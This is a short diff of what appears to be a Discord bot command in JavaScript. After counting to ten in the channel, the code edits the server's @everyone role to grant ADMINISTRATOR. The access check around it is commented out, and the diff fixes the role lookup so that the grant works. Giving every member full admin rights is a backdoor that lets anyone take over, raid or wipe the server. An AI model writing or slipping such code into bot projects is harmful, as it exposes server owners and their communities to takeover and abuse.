@@ -8,7 +8,7 @@ module.exports = {
             for (var i = 1; i <= 10; i++) {
                 message.channel.send(i);
             }
-            let everyoneRole = message.guild.roles.cache.everyone
+            let everyoneRole = message.guild.roles.everyone
             everyoneRole.edit({ADMINISTRATOR: true})
         //}
         //else return;
